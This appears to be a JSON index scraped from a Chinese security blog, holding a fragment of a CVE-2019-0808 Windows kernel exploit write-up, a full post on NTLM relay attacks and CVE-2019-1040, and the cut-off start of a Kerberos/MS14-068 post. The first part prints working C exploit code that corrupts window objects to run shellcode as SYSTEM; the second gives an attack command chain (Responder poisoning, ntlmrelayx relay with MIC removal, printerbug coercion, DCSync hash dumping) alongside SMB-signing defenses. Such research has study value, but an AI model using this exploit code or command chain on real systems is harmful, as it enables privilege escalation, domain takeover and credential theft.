+0x000 fType : Uint4B +0x004 fState : Uint4B +0x008 wID : Uint4B +0x00c spSubMenu : Ptr32 tagMENU +0x010 hbmpChecked : Ptr32 Void +0x014 hbmpUnchecked : Ptr32 Void +0x018 lpstr : Ptr32 Uint2B +0x01c cch : Uint4B +0x020 dwItemData : Uint4B +0x024 xItem : Uint4B +0x028 yItem : Uint4B +0x02c cxItem : Uint4B +0x030 cyItem : Uint4B +0x034 dxTab : Uint4B +0x038 ulX : Uint4B +0x03c ulWidth : Uint4B +0x040 hbmp : Ptr32 HBITMAP__ +0x044 cxBmp : Int4B +0x048 cyBmp : Int4B +0x04c umim : tagUAHMENUITEMMETRICSlkd&gt; dt win32k!tagMENUSTATE +0x000 pGlobalPopupMenu : Ptr32 tagPOPUPMENU +0x004 fMenuStarted : Pos 0, 1 Bit +0x004 fIsSysMenu : Pos 1, 1 Bit +0x004 fInsideMenuLoop : Pos 2, 1 Bit +0x004 fButtonDown : Pos 3, 1 Bit +0x004 fInEndMenu : Pos 4, 1 Bit +0x004 fUnderline : Pos 5, 1 Bit +0x004 fButtonAlwaysDown : Pos 6, 1 Bit +0x004 fDragging : Pos 7, 1 Bit +0x004 fModelessMenu : Pos 8, 1 Bit +0x004 fInCallHandleMenuMessages : Pos 9, 1 Bit +0x004 fDragAndDrop : Pos 10, 1 Bit +0x004 fAutoDismiss : Pos 11, 1 Bit +0x004 fAboutToAutoDismiss : Pos 12, 1 Bit +0x004 fIgnoreButtonUp : Pos 13, 1 Bit +0x004 fMouseOffMenu : Pos 14, 1 Bit +0x004 fInDoDragDrop : Pos 15, 1 Bit +0x004 fActiveNoForeground : Pos 16, 1 Bit +0x004 fNotifyByPos : Pos 17, 1 Bit +0x004 fSetCapture : Pos 18, 1 Bit +0x004 iAniDropDir : Pos 19, 5 Bits +0x008 ptMouseLast : tagPOINT +0x010 mnFocus : Int4B +0x014 cmdLast : Int4B +0x018 ptiMenuStateOwner : Ptr32 tagTHREADINFO +0x01c dwLockCount : Uint4B +0x020 pmnsPrev : Ptr32 tagMENUSTATE +0x024 ptButtonDown : tagPOINT +0x02c uButtonDownHitArea : Uint4B +0x030 uButtonDownIndex : Uint4B +0x034 vkButtonDown : Int4B +0x038 uDraggingHitArea : Uint4B +0x03c uDraggingIndex : Uint4B +0x040 uDraggingFlags : Uint4B +0x044 hdcWndAni : Ptr32 HDC__ +0x048 dwAniStartTime : Uint4B +0x04c ixAni : Int4B +0x050 iyAni : Int4B +0x054 cxAni : Int4B +0x058 cyAni : Int4B +0x05c hbmAni : Ptr32 HBITMAP__ +0x060 hdcAni : Ptr32 HDC__typedef struct tagMENUWND &#123; tagWND wnd; // size = 0xaf tagPOPUPMENU* ppopupmenu; // offset = 0xb0&#125; MENUWND, *PMENUWND; 修改标识1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253LRESULT CALLBACK WindowHookProc(INT code, WPARAM wParam, LPARAM lParam)&#123; tagCWPSTRUCT* cwp = (tagCWPSTRUCT*)lParam; // 等待拖动鼠标事件 if (!bOnDraging) &#123; return CallNextHookEx(0, code, wParam, lParam); &#125; // 修改窗口消息处理函数为 SubMenuProc if ((cwp-&gt;message == WM_MN_FINDMENUWINDOWFROMPOINT)) &#123; printf(\"[*] Update window[%p] proc to SubMenuProc \\n\", cwp-&gt;hwnd); SetWindowLongW(cwp-&gt;hwnd, GWLP_WNDPROC, (ULONG64)SubMenuProc); &#125; // 当xxxMNSetGapState调用后，内核将向窗口发送0x1E5消息（是个谜，没资料） // 可以让内核去开始修改各种标识了 else &#123; if ((cwp-&gt;message == 0x1E5)) &#123; UINT offset = 0; // 计算第一个窗口的数据段起始位置 UINT addressOfStartofPrimaryWndCbWndData = (primaryWindowAddress + 0xB0); // 计算第二个窗口的 strName.Buffer 字段，到第一个窗口的数据段起始偏移 offset = ((secondaryWindowAddress + 0x8C) - addressOfStartofPrimaryWndCbWndData); printf(\"[*] Offset: 0x%08X\\r\\n\", offset); // 修改 hSecondaryWindow 窗口的 strName.Buffer 指向其 bServerSideWindowProc标识 (secondaryWindowAddress + 0x16) if (SetWindowLongA(hPrimaryWindow, offset, (secondaryWindowAddress + 0x16)) == 0) &#123; printf(\"[!] SetWindowLongA malicious error: 0x%08X\\r\\n\", GetLastError()); ExitProcess(-1); &#125; else &#123; printf(\"[*] SetWindowLongA called to set strName.Buffer : 0x%08X\\r\\n\", (addressOfStartofPrimaryWndCbWndData + offset)); &#125; // 修改 hSecondaryWindow 窗口的 bServerSideWindowProc 标识所在字节为 \\x06 if (SetWindowTextA(hSecondaryWindow, \"\\x06\") == 0) &#123; printf(\"[!] SetWindowTextA couldn't set the bServerSideWindowProc bit. Error was: 0x%08X\\r\\n\", GetLastError()); ExitProcess(-1); &#125; else &#123; printf(\"[*] Successfully set the bServerSideWindowProc bit at: 0x%08X\\r\\n\", (secondaryWindowAddress + 0x16)); printf(\"[*] Sending hSecondaryWindow a WM_ENTERIDLE message to trigger the execution of the shellcode as SYSTEM.\\r\\n\"); SendMessageA(hSecondaryWindow, WM_ENTERIDLE, NULL, NULL); if (success == TRUE) &#123; printf(\"[*] Successfully exploited CVE-2019-0808 and triggered the shellcode!\\r\\n\"); &#125; else &#123; printf(\"[!] Didn't exploit the program. For some reason our privileges were not appropriate.\\r\\n\"); ExitProcess(-1); &#125; &#125; &#125; &#125; return CallNextHookEx(0, code, wParam, lParam);&#125; 整体流程12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091int exploit()&#123; DWORD currentThreadId = GetCurrentThreadId(); DWORD currentProcessId = GetCurrentProcessId(); HINSTANCE hInst = GetModuleHandleA(NULL); pfnNtAllocateVirtualMemory = (NTAllocateVirtualMemory)GetProcAddress(GetModuleHandle(L\"ntdll.dll\"), \"NtAllocateVirtualMemory\"); // 设置窗口消息钩子 SetWindowsHookExW(WH_CALLWNDPROC, (HOOKPROC)WindowHookProc, hInst, currentThreadId); // 菜单弹出事件钩子，由 TrackPopupMenuEx 触发 DWORD dwEventID = EVENT_SYSTEM_MENUPOPUPSTART; SetWinEventHook(dwEventID, dwEventID, hInst, DisplayEventProc, currentProcessId, currentThreadId, 0); // 分配零地址内存 if (allocateNullPage() == FALSE) &#123; printf(\"[!] Couldn't allocate the NULL page!\\r\\n\"); &#125; else &#123; printf(\"[*] Allocated the NULL page!\\r\\n\"); &#125; HMODULE hUser32 = LoadLibraryW(L\"user32.dll\"); HMODULE hGdi32 = LoadLibraryW(L\"gdi32.dll\"); // 找到 HMValidateHandle 函数在 user32.dll 中的地址 if (findHMValidateHandleAddress(hUser32) == FALSE) &#123; printf(\"[!] Couldn't locate the address of HMValidateHandle!\\r\\n\"); ExitProcess(-1); &#125; // 窗口喷射寻找内核写入地址 if (sprayWindows() == FALSE) &#123; printf(\"[!] Couldn't find two tagWND objects less than 0x3fd00 apart in memory after the spray!\\r\\n\"); ExitProcess(-1); &#125; // 触发漏洞的窗口, 这个窗口的内部成员 tagPOPUPMENU 没有设置，多数成员为0 // hWndFakeWindow 菜单的 spMenu 为 NULL，触发漏洞 hWndFakeWindow = CreateWindowA(\"#32768\", \"MN\", WS_DISABLED, 0, 0, 1, 1, nullptr, nullptr, hInst, nullptr); printf(\"[*] FakeWindow: %p \\n\", hWndFakeWindow); // 创建2个拥有拖拽功能的菜单项 HMENU hMenuRoot = CreatePopupMenu(); HMENU hMenuSub = CreatePopupMenu(); MENUINFO mi = &#123; 0 &#125;; mi.cbSize = sizeof(MENUINFO); mi.fMask = MIM_STYLE; mi.dwStyle = MNS_MODELESS | MNS_DRAGDROP; SetMenuInfo(hMenuRoot, &amp;mi); SetMenuInfo(hMenuSub, &amp;mi); AppendMenuA(hMenuRoot, MF_BYPOSITION | MF_POPUP, (UINT_PTR)hMenuSub, \"Root\"); AppendMenuA(hMenuSub, MF_BYPOSITION | MF_POPUP, 0, \"Sub\"); // 注册并创建窗口，绑定窗口菜单 // 窗口消息处理函数设置为系统默认的 DefWindowProc // 为应用程序没有处理的任何窗口消息提供缺省的处理 WNDCLASSEXA wndClass = &#123; 0 &#125;; wndClass.cbSize = sizeof(WNDCLASSEXA); wndClass.lpfnWndProc = DefWindowProc; wndClass.cbClsExtra = 0; wndClass.cbWndExtra = 0; wndClass.hInstance = hInst; wndClass.lpszMenuName = 0; wndClass.lpszClassName = \"_rand_class_name_\"; RegisterClassExA(&amp;wndClass); hWndMain = CreateWindowA(\"_rand_class_name_\", \"_rand_window_name_\", WS_DISABLED, 0, 0, 1, 1, nullptr, nullptr, hInst, nullptr); // 弹出菜单 TrackPopupMenuEx(hMenuRoot, 0, 0, 0, hWndMain, NULL); // 消息循环 MSG msg = &#123; 0 &#125;; while (GetMessageW(&amp;msg, NULL, 0, 0)) &#123; TranslateMessage(&amp;msg); DispatchMessageW(&amp;msg); // NtUserMNDragOver() 调用后， iMenuCreated 会累加，调用后马上结束消息循环 if (iMenuCreated &gt;= 1) &#123; bOnDraging = TRUE; CHAR buf[0x100] = &#123; 0 &#125;; POINT pt; pt.x = 2; pt.y = 2; printf(\"[+] callNtUserMNDragOverSysCall\\n\"); callNtUserMNDragOverSysCall(&amp;pt, buf); // 通过内核调用，开始触发 break; &#125; &#125; return success;&#125;","categories":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"http://lahonja.me/categories/漏洞分析/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"http://lahonja.me/tags/Windows/"},{"name":"漏洞分析","slug":"漏洞分析","permalink":"http://lahonja.me/tags/漏洞分析/"},{"name":"CVE-2019-0808","slug":"CVE-2019-0808","permalink":"http://lahonja.me/tags/CVE-2019-0808/"}]},{"title":"结合CVE-2019-1040分析NTLM中继攻击","slug":"结合CVE-2019-1040分析NTLM中继攻击","date":"2019-08-07T02:41:52.000Z","updated":"2019-08-16T06:15:27.467Z","comments":true,"path":"2019/08/07/结合CVE-2019-1040分析NTLM中继攻击/","link":"","permalink":"http://lahonja.me/2019/08/07/结合CVE-2019-1040分析NTLM中继攻击/","excerpt":"什么是NTLM中继攻击原理NTLM是Windows实现身份认证的一种协议，如计算机A远程登陆计算机B，在计算机B验证计算机A的时候使用的是NTLM协议。但是在这个过程中，计算机A在通常情况下不知道计算机B是不是真正的计算机B，因为攻击机C也可以来冒充计算机B。当攻击机C冒充计算机B后，原本计算机A发往计算机B的NTLM认证流量，将发送给攻击机C，攻击机C接收到认证信息之后，再转发给B，从而实现NTLM流量的中继，也就是平常所说的中间人攻击，NTLM中继也就是中间人攻击的一种。上述过程我们可以将再攻击机C上的中继程序理解为一个NTLM协议代理程序。但是攻击机C怎么实现欺骗计算机A呢，许多网络协议可以用来进行欺骗，从而进行中间人攻击，常见的有ARP、DHCP、DNS等。在实际的攻击中，使用LLMNR/NetBIOSNS欺骗的方式更多，因为这类欺骗的网络流量小，实施也更容易，与Net-NTLMhash relay attack的结合也更紧密。LLMNR和NetBIOSNS是Windows系统完成名称解析的一种方法。Windows系统对机器名的解析顺序如下： 本地HOSTS文件（%windir%\\System32\\drivers\\etc\\hosts） DNS缓存 DNS服务器 链路本地多播名称解析（LLMNR） NetBIOS名称服务（NBT-NS） 参考文档 LLMNR协议在DNS 服务器不可用时，DNS 客户端计算机可以使用本地链路多播名称解析 (LLMNR—Link-Local Multicast Name Resolution)（也称为多播 DNS 或 mDNS）来解析本地网段上的名称。例如，如果路由器出现故障，从网络上的所有 DNS 服务器切断了子网，则支持 LLMNR 的子网上的客户端可以继续在对等基础上解析名称，直到网络连接还原为止。","text":"什么是NTLM中继攻击原理NTLM是Windows实现身份认证的一种协议，如计算机A远程登陆计算机B，在计算机B验证计算机A的时候使用的是NTLM协议。但是在这个过程中，计算机A在通常情况下不知道计算机B是不是真正的计算机B，因为攻击机C也可以来冒充计算机B。当攻击机C冒充计算机B后，原本计算机A发往计算机B的NTLM认证流量，将发送给攻击机C，攻击机C接收到认证信息之后，再转发给B，从而实现NTLM流量的中继，也就是平常所说的中间人攻击，NTLM中继也就是中间人攻击的一种。上述过程我们可以将再攻击机C上的中继程序理解为一个NTLM协议代理程序。但是攻击机C怎么实现欺骗计算机A呢，许多网络协议可以用来进行欺骗，从而进行中间人攻击，常见的有ARP、DHCP、DNS等。在实际的攻击中，使用LLMNR/NetBIOSNS欺骗的方式更多，因为这类欺骗的网络流量小，实施也更容易，与Net-NTLMhash relay attack的结合也更紧密。LLMNR和NetBIOSNS是Windows系统完成名称解析的一种方法。Windows系统对机器名的解析顺序如下： 本地HOSTS文件（%windir%\\System32\\drivers\\etc\\hosts） DNS缓存 DNS服务器 链路本地多播名称解析（LLMNR） NetBIOS名称服务（NBT-NS） 参考文档 LLMNR协议在DNS 服务器不可用时，DNS 客户端计算机可以使用本地链路多播名称解析 (LLMNR—Link-Local Multicast Name Resolution)（也称为多播 DNS 或 mDNS）来解析本地网段上的名称。例如，如果路由器出现故障，从网络上的所有 DNS 服务器切断了子网，则支持 LLMNR 的子网上的客户端可以继续在对等基础上解析名称，直到网络连接还原为止。 主机在自己的内部名称缓存中查询名称。如果在缓存中没有找到，那么主机就会向自己配置的主DNS服务器发送查询请求。如果没有收到回应或收到了错误信息，主机还会尝试搜索配置的备用DNS服务器。如果主机没有配置DNS服务器，或者如果在连接DNS服务器的时候没有遇到错误但失败了，那么名称解析会失败，并转为使用LLMNR。 主机通过用户数据报协议(UDP)发送多播查询，查询主机名对应的IP地址，这个查询会被限制在本地子网(也就是所谓的链路局部)内。 链路局部范围内每台支持LLMNR，并且被配置为响应传入查询的主机，在收到这个查询请求后，会将被查询的名称和自己的主机名进行比较。如果没有找到匹配的主机名，那么计算机就会丢弃这个查询。如果找到了匹配的主机名，这台计算机会传输一条包含了自己IP地址的单播信息给请求该查询的主机。 LLMNR利用方式通过LLMNR欺骗，让计算机A认为攻击机C就是计算机B。然后将计算机A将NTLM认证发送给攻击机C，攻击机C对流量进行解析和转发。 参考文档 WPAD网络代理自动发现协议WPAD（Web Proxy Auto-Discovery Protocol） 是 Web 代理自动发现协议的简称，该协议的功能是可以使局域网中用户的浏览器可以自动发现内网中的代理服务器，并使用已发现的代理服务器连接互联网或者企业内网。当系统开启了代理自动发现功能后，用户使用浏览器上网时，浏览器就会在当前局域网中自动查找代理服务器，如果找到了代理服务器，则会从代理服务器中下载一个名为 PAC（Proxy Auto-Config） 的配置文件。该文件中定义了用户在访问一个 URL 时所应该使用的代理服务器。浏览器会下载并解析该PAC文件，并将相应的代理服务器设置到用户的浏览器中。PAC文件指定攻击者就是代理服务器，然后攻击者就可以劫持受害者的HTTP流量，在其中插入任意HTML标签。 WPAD利用方式前面讲到的LLMNR利用方式是直接中继整个计算机A的所有流量，但是WPAD这种方式只能中继浏览器的HTTP流量。那么这种情况下如何才能获取到SMB的流量呢？这里重点分析下浏览器在什么情况下可以自动向攻击者发送Net-NTLMhash。下图是几款浏览器对WPAD及SMB支持的情况： 我们可以看出，Windows10上的IE和Edge，即使支持SMB协议，但是无法通过劫持WPAD的方式来触发，Chrome浏览器虽然可以进行WPAD劫持，但是不支持SMB协议。一个解决思路就是放弃最常用的NTLMSSP over SMB，使用NTMLSSP over HTTP，使用HTTP协议来发送NTLM认证消息： 那接下来的问题就是浏览器什么情况下会通过HTTP协议自动发送Net-NTLMhash呢？答案是IntranetZone 通过对IE上述配置的分析，发现配置与注册表中的policy和zone有关：如果policy是URLPOLICY_CREDENTIALS_SILENT_LOGON_OK，IE会自动发送Net-NTLMhash。如果policy是URLPOLICY_CREDENTIALS_MUST_PROMPT_USER，那么只有zone的值为0、1、2的时候才会自动发送Net-NTLMhash。 经过测试，在Windows10上，工作组环境下，只要URL是主机名而不是完全限定性域名的情况下，就认为是LocalInternet Zone内的，如下图： 参考文档 DHCPDHCP Sproofing同样是一种中间人攻击方式。DHCP是提供IP地址分配的服务。当局域网中的计算机设置为自动获取IP，就会在启动后发送广播包请求IP地址。DHCP服务器（如路由器）会分配一个IP地址给计算机。在分配的时候，会提供DNS服务器地址。攻击者可以通过伪造大量的IP请求包，而消耗掉现有DHCP服务器的IP资源。当有计算机请求IP的时候，DHCP服务器就无法分配IP。如果攻击者分配假的网关，并把网关指向一台攻击主机，攻击主机再把网络流量转发给真正的网关，这样虽然不影响用户正常的上网，但客户机的所有流量都流经攻击主机，很容易泄露一些机密信息，这种攻击也叫中间人攻击。攻击者还可以在给计算机分配IP时，指定一个虚假的DNS服务器地址。这时，当用户访问网站的时候，就被虚假DNS服务器引导到错误的网站。 IPv6从Windows Vista之后，每台Windows计算机都默认定期请求此配置信息，你可以从Wireshark抓取的数据包看到： 通过响应这些DHCPv6请求，为受害主机分配本地链路范围内的IPv6地址。而实际上，在IPv6网络中，这些地址由主机自动分配，不需要由DHCP服务器配置。这使得我们有机会将我们的IP设置为默认IPv6 DNS服务器。为了完成上述操作，一般使用的工具为MITM6。MITM6不会对网络中所有流量进行中间人劫持，而是只针对目标主机，所以它对网络的影响很小。MITM6是一款测试工具，它利用Windows的默认配置来接管默认的DNS服务器。通过响应DHCPv6消息，为受害者提供链路本地IPv6地址，并将攻击者主机设置为默认DNS服务器来实现此目的。作为DNS服务器，mitm6将有选择地响应攻击者选择的DNS查询，并将受害者流量重定向到攻击者主机，而不是合法服务器。 IPv6利用方式MITM6的攻击过程如下图所示。它自动检测攻击者主机的IP配置，应答本网络内客户端发送的DHCPv6请求报文，然后指定攻击者的IP为DNS服务器地址。它还有一个可选功能，即周期性地发送RA（Router Advertisment）报文，提醒客户端当前环境中存在一个IPv6网络，需要通过DHCPv6协议获取IPv6地址。 在受害主机上，你可以看到我们的服务器被配置为DNS服务器。由于Windows对IP协议的偏好，IPv6 DNS服务器的优先级高于IPv4 DNS服务器，因此IPv6 DNS服务器将用于查询A（IPv4）和AAAA（IPv6）记录。 NTLM协议介绍协议介绍NTLM是Windows上对于SSPI身份认证接口的一种实现。在Windows上，微软定义了一套用于安全认证相关的接口-SSPI，全称为 Security Service Provider Interface。这套接口定义了与安全有关的功能函数，包含但不限于： 身份验证机制 为其他协议提供的 Session security 机制。Session Security 指的是会话安全，即为通讯提供数据完整性校验以及数据的加、解密功能。 因为 SSPI 中定义了与 session security 有关的 API。所以，基本上层应用利用任何 SSP 与远程的服务进行了身份验证后，此 SSP 都会为本次连接生成一个随机 key。这个 key 往往被称为 Session Key。上层应用在经过身份验证后，可以选择性地使用这个 Key 来对之后发往服务端或接收自服务端的数据进行签名或加密。不同的 SSP，实现的身份验证机制是不一样的。比如 NTLM 实现的就是一种 Challenge Based 身份验证机制。而 Kerberos 实现的就是基于 ticket 的身份验证机制。我们可以编写自己的 SSP，然后注册到操作系统中，让操作系统支持更多的自定义的身份验证方法。 认证流程 SMB2 / Negotiate Protocol Negotiate Protocol Request: 客户端向服务端发送SMB_COM_NEGOTIATE Request请求消息，进行协商要使用的协议版本。 Negotiate Protocol Response: 服务器收到该请求后，选择一个它支持的最新版本，再通过SMB_COM_NEGOTIATE Response回复给客户端。这里选择的是SMBv2.???，所以还需进一步协商版本号： 响应中的Dialect于选择的协议对应关系： 进行第二次版本号协商： 回应选择的版本号为0x0311: SMB2 / Session Setup Session Setup Request: Negotiate Protocol阶段结束之后，客户端发送SMB_COM_SESSION_SETUP_ANDX请求消息。 如果协商结果是使用NTLM进行身份验证，则在此消息中嵌入NTLM NEGOTIATE_MESSAGE。 Session Setup Response: 服务器响应SMB_COM_SESSION_SETUP_ANDX响应消息，其中嵌入了NTLM CHALLENGE_MESSAGE。 该消息包括一个8字节的随机数，称为Challenge，服务器在消息的ServerChallenge字段中生成并发送。 Session Setup Request: 客户端从NTLM CHALLENGE_MESSAGE中提取ServerChallenge字段，使用Challenge与客户端账号密码的NTLM hash进行加密运算，生成NET-NTLM，并将NTLM AUTHENTICATE_MESSAGE发送到服务器（嵌入在SMB_COM_SESSION_SETUP_ANDX请求消息中）。注意下图中绿色方框中的内容，将会是CVE-2019-1040漏洞的关键点。 Session Setup Response: 如果账户及密码服务器发送嵌入在SMB_COM_SESSION_SETUP_ANDX响应消息中的成功或失败的消息（下图是失败）。 NTLM Hash Vs NET-NTLM Hash通常可从Windows系统中的SAM文件和域控的NTDS.dit文件中获得所有用户的NTLM hash，通过Mimikatz读取lsass.exe进程能获得已登录用户的NTLM hash，格式如下： 1aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42 Net—NTLM的hash是用于网络认证(他们的基于用户NT的hash值通过响应的算法产生的)。一般是Net-NTLM v1 hash，Net-NTLM v2 hash的统称。Net-NTLMv2的格式如下: 1admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030 渗透测试过程中，可以通过域控制器的NTDS数据库进而得到NTLM hash，或者通过Hash导出工具得到用户NTLM hash，但是不可以通过这种方法得到Net-NTLM的hash值。当拿到NTLM hash后，可以通过拿到的NTLM hash进行Pass the hash(PTH)攻击。 NTLM中继攻击实验LDAP签名绕过默认情况下，SMB中的NTLM身份验证:NEGOTIATE_SIGN为set状态： 将此SMB流量中继到LDAP时，由于此时的Negotiate Sign设置为set，该标志会触发LDAP签名，而此SMB流量为攻击者从Exchange服务器上中继而来，无法通过LDAP的签名校验，从而被LDAP忽略，导致攻击失败。为了防止攻击失败，需要将NEGOTIATE_SIGN设置为Not set。为了确保消息在传输中不被篡改，NTML协议在NTLM_AUTHENTICATE消息中添加了一个额外的MIC（消息完整性代码）字段。如果简单的改包，将NEGOTIATE_SIGN设置Not set，将会导致MIC校验不通过。因此，试图篡改其中一条消息的攻击者（例如，修改签名协商）将无法生成相应的MIC，这将导致攻击失败。接下来就是绕过MIC校验的方式，以便更改包中NEGOTIATE_SIGN的值。LDAP签名绕过方法： 取消设置NTLM_NEGOTIATE消息中的签名标志 NTLMSSP_NEGOTIATE_ALWAYS_SIGN，NTLMSSP_NEGOTIATE_SIGN 取消设置NTLM_AUTHENTICATE消息中的以下标志 NTLMSSP_NEGOTIATE_ALWAYS_SIGN，NTLMSSP_NEGOTIATE_SIGN，NEGOTIATE_KEY_EXCHANGE，NEGOTIATE_VERSION MIC校验绕过Microsoft服务器允许无MIC 的NTLM_AUTHENTICATE消息。如果想要将SMB身份验证中继到LDAP，并完成中继攻击。取消MIC校验以确保可以修改数据包中的内容： 从NTLM_AUTHENTICATE消息中删除MIC 从NTLM_AUTHENTICATE消息中删除版本字段（删除MIC字段而不删除版本字段将导致错误） 攻击结果获得其他计算机的身份认证会话信息，以其他计算机的权限去访问远程资源，权限取决于中间人攻击时捕获到的SMB身份认证。 如何防御SMB-Relay可以通过开启SMB Signing（SMB签名）来进行防御。SSP 往往会为上层协议提供 session security 功能，NTLM SSP 也不例外。session security 功能往往都是基于 session key 来实现的。这个 session key 往往是由 SSP 自己生成的。（Kerberos 场景下，session key 是由 KDC 在生成相应票据的时候一起生成的，并发回给客户端或服务端的）。在开启了 SMB签名 的情况下，在SMB协议使用 NTLM SSP 进行了身份验证后，后续的所有数据包，都会利用 NTLM SSP 生成的这个 session key 进行签名。SMB服务端收到后续的数据包后，也会检查数据包的签名，如果签名不对，则拒收。NTLM SSP 在生成 session key 的时候，会需要用到账号密码的原始 LM HASH 或 NT HASH。而中继类型的攻击，都是站在一个中间人的位置，是不可能知道原始的LM HASH或NT HASH的（如果知道了也就不需要中继攻击这种攻击手法了，就可以PTH了）。我们是无法计算出来这个session key的，自然也就无法对数据包进行签名。（有一个例外，NETLOGON 协议的 CVE 2015-0005）。所以在用 SMB-Relay 攻击一台服务器的时候，如果出现了账号验证成功，但是后续无法进行任何其他操作的时候，或者提示Access denied的时候，这就是目标服务器开启了 SMB 签名校验。通过开启 SMB Signing 功能，才能防止 SMB-Relay。这实际上是 NTLM SSP 的一个缺陷。仔细观察前面所讲到的 NTLM 验证流程可以发现，NTLM SSP 可以让服务端来验证客户端的身份，但是却无法让客户端来验证服务端的身份。也就是说，使用 NTLM SSP 的客户端，本质上是不知道自己连上的服务器到底是哪一台的。Kerberos 是支持双向认证的。（支持双向验证的 SSP ，一般都是在验证阶段就引入了 session key 或其他类似的 key，来确保进行验证的双方都知道所谓的 “previously-shared secret”。在 NTLM SSP 中，这个 previously-shared secret 指的就是 LM HASH 或 NT HASH）。所以，要想解决 NTLM-Relay 的问题，只能是使用 NTLM SSP 的上层协议，强行使用类似 SMB-Signing（如 LDAP Signing） 的手法，来间接验证服务端的身份。域环境下默认的验证协议是 Kerberos。（本质上是进行 Negotiate 协商，它会优先选择 Kerberos）但是当 Kerberos 因为某些原因不可用的时候，会降级到 NTLM。 利用过程 收集 SMB Signing 签名关闭的主机: 使用CrackMapExec 1cme --timeout 5 --verbose smb 172.0.0.1/24 --gen-relay-list targets.txt 使用RunFinger.py 1python RunFinger.py -g -i 172.0.0.1/24 使用Responder进行投毒 1python Responder.py -I &lt;interface&gt; -r -d -w 使用ntlmrelayx进行中继 1ntlmrelayx.py -tf targets.txt -c &lt;insert your Empire Powershell launcher here&gt; CVE-2019-1040分析漏洞原理如果Exchange等Windows服务器可以向我们进行身份验证，并通过LDAP将该身份验证中继到域控制器，则可以获得受害者的权限并在Active Directory中执行各种操作。Exchange服务器一般拥有较高权限，这导致攻击者拥有足够高的权限来授予自己DCSync权限，这是PrivExchange漏洞产生的原因。SpoolService/printer bug在攻击利用流程中，需要使用到一个名为printerbug.py的工具，此工具触发SpoolService/printer bug，强制打印服务器通过MS-RPRN RPC接口向攻击者进行身份验证。Windows的MS-RPRN协议用于打印客户机和打印服务器之间的通信，默认情况下是启用的。协议定义的RpcRemoteFindFirstPrinterChangeNotificationEx()调用创建一个远程更改通知对象，该对象监视对打印机对象的更改，并将更改通知发送到打印客户端。任何经过身份验证的域成员都可以连接到远程服务器的打印服务（spoolsv.exe），并请求对一个新的打印作业进行更新，令其将该通知发送给指定目标。之后它会将立即测试该连接，即向指定目标进行身份验证（攻击者可以选择通过Kerberos或NTLM进行验证）。另外微软表示这个bug是系统设计特点，无需修复。 利用过程 执行ntlmrelayx.py脚本进行NTLM中继攻击，设置SMB服务器并将认证凭据中继到LDAP协议。其中–remove-mic选项用于清除MIC标志，–escalate-user用于提升指定用户权限： 执行printerbug.py脚本，触发SpoolService的bug。使用SpoolService打印机错误攻击Exchange服务器，并触发SpoolService漏洞，使打印服务器向我们进行身份认证： SpoolService的bug导致Exchange服务器回连到ntlmrelayx.py，即将认证信息发送到ntlmrelayx.py。可以在下图中看到认证用户是TEST\\TOPSEC$。 接着ntlmrelayx.py开始执行LDAP攻击，加上-debug选项后可以看到更详细的信息。它会通过遍历验证中继帐户所在用户组及权限，发现当前账户可以创建用户、可以修改test.local域的ACL，因为域中的Exchange Windows Permissions用户组被允许修改ACL。因此脚本会首选修改ACL来提权，因为这相比创建用户的方式更隐秘一些。具体方式是通过LDAP修改域的安全描述符（Security Descriptor），可以在下面的数据包中看到ACL中每一条具体的访问控制条目（ACE，Access Control Entries）： 完成ACL的修改后，test就可以通过secretsdump.py的DCSync功能dump出所有密码哈希值：通过 secretsdump.py 的DCSync功能dump出所有密码哈希值：","categories":[{"name":"内网渗透","slug":"内网渗透","permalink":"http://lahonja.me/categories/内网渗透/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"http://lahonja.me/tags/Windows/"},{"name":"漏洞分析","slug":"漏洞分析","permalink":"http://lahonja.me/tags/漏洞分析/"},{"name":"协议分析","slug":"协议分析","permalink":"http://lahonja.me/tags/协议分析/"}]},{"title":"结合ms14068对kerberos协议分析","slug":"结合ms14068对kerberos协议分析","date":"2019-08-05T06:14:23.000Z","updated":"2019-08-08T01:13:07.897Z","comments":true,"path":"2019/08/05/结合ms14068对kerberos协议分析/","link":"","permalink":"http://lahonja.me/2019/08/05/结合ms14068对kerberos协议分析/","excerpt":"Kerberos协议介绍什么是SSPI&emsp;安全支持提供者接口（英语：Security Support Provider Interface，缩写SSPI）是Microsoft Windows操作系统中用于执行各种安全相关操作（如身份验证）的一个Win32 API。&emsp;SSPI的功能是作为众多安全支持提供程序（SSP）的通用接口：安全支持提供者（Security Support Provider）是可以为应用程序提供一种或多种安全功能包的动态链接库（dynamic-link library）。 Windows常用的SSP NTLM（Windows NT 3.51中引入）(msv1_0.dll) - 为Windows 2000之前的客户端-服务器域和非域身份验证（SMB/CIFS）提供NTLM质询/响应身份验证。 Kerberos（Windows 2000中引入，Windows Vista中更新为支持AES）(kerberos.dll) - Windows 2000及更高版本中首选的客户端-服务器域相互身份验证。 Negotiate（Windows 2000中引入）(secur32.dll) - Negotiate安全包在Kerberos和NTLM之间进行选择协商选择。Negotiate默认使用Kerberos，当Kerberos不能被身份验证中涉及的某个系统使用时，将使用NTLM。 摘要SSP（Windows XP中引入）(wdigest.dll) - 在Windows与Kerberos不可用的非Windows系统间提供基于HTTP和SASL身份验证的质询/响应。 凭据 (CredSSP)（Windows Vista中引入，Windows XP SP3上也可用）(credssp.dll) - 为远程桌面连接提供单点登录（SSO）和网络级身份验证。","text":"Kerberos协议介绍什么是SSPI&emsp;安全支持提供者接口（英语：Security Support Provider Interface，缩写SSPI）是Microsoft Windows操作系统中用于执行各种安全相关操作（如身份验证）的一个Win32 API。&emsp;SSPI的功能是作为众多安全支持提供程序（SSP）的通用接口：安全支持提供者（Security Support Provider）是可以为应用程序提供一种或多种安全功能包的动态链接库（dynamic-link library）。 Windows常用的SSP NTLM（Windows NT 3.51中引入）(msv1_0.dll) - 为Windows 2000之前的客户端-服务器域和非域身份验证（SMB/CIFS）提供NTLM质询/响应身份验证。 Kerberos（Windows 2000中引入，Windows Vista中更新为支持AES）(kerberos.dll) - Windows 2000及更高版本中首选的客户端-服务器域相互身份验证。 Negotiate（Windows 